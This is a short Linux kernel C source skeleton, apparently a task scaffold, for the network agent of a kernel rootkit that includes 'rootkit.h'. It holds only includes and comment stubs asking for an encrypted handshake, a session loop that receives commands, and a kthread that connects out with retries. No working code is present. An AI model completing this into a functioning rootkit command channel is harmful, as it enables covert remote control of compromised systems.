// SPDX-License-Identifier: GPL-2.0
// network/agent.c - Agent kthread: connect, handshake, session loop.
#include <crypto/aead.h>
#include <linux/delay.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <net/net_namespace.h>

#include "rootkit.h"

// Implement rk_handshake: exchange encrypted HELLO to confirm shared key.

// Implement rk_handle_session: receive commands, echo them back sealed.

// Implement rk_agent_thread: connect, init crypto, handshake, session loop with retry.
